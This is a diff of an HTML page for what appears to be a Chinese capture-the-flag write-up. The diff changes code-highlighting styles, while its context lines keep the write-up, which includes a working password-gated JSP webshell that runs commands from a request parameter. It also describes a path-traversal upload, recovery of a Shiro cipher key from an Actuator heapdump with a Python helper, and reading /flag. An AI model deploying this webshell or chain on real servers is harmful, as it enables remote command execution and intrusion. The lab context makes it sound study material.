@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -252,7 +260,7 @@
 <p>上传<code>.jsp</code>马，但上传的文件目录<code>jsp</code>文件不能访问，所以要上传到上一级目录，修改<code>aaaa.jsp</code>为<code>../a.jsp</code></p>
 <p>在<code>burp-&gt;hex</code>里或者winhex,010editor里应该都行，但我一个都没成功。。。。。。。。。。。。。。。。</p>
 <p>网上的jsp马</p>
-<div class="hljs"><pre><code class="hljs jsp">&lt;%
+<pre><code class="hljs jsp">&lt;%
 <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;
 java.io.InputStream in =
 Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();
@@ -264,7 +272,7 @@ out.println(<span class="hljs-keyword">new</span> String(b));
 &#125;
 out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);
 &#125;
-%&gt;</code></pre></div>
+%&gt;</code></pre>
 
 
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122326594.png" srcset="/img/loading.gif"></p>
@@ -272,12 +280,12 @@ out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);
 <p><code>heapdump</code>放到<code>visualVM</code>分析<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">Actuator 未授权访问之heapdump利用 </a></p>
 <p><code>查找Shiro CipherKey</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122332753.png" srcset="/img/loading.gif"></p>
 <p>脚本对byte转换为base64编码的key</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
 <span class="hljs-keyword">import</span> struct
 
 a=base64.b64encode(struct.pack(<span class="hljs-string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>,<span class="hljs-number">-19</span>,<span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">114</span>, <span class="hljs-number">-3</span>, <span class="hljs-number">79</span>, <span class="hljs-number">86</span>, <span class="hljs-number">4</span>, <span class="hljs-number">108</span>, <span class="hljs-number">-45</span>,
 <span class="hljs-number">69</span>, <span class="hljs-number">-107</span>, <span class="hljs-number">-38</span>, <span class="hljs-number">-72</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-23</span>))
-print(a)</code></pre></div>
+print(a)</code></pre>
 <p>shiro利用工具</p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122333889.png" srcset="/img/loading.gif"></p>
 <p><code>cat /flag</code></p>
@@ -438,6 +446,8 @@ print(a)</code></pre></div>
 
 
 
+  
+    
   
 
 
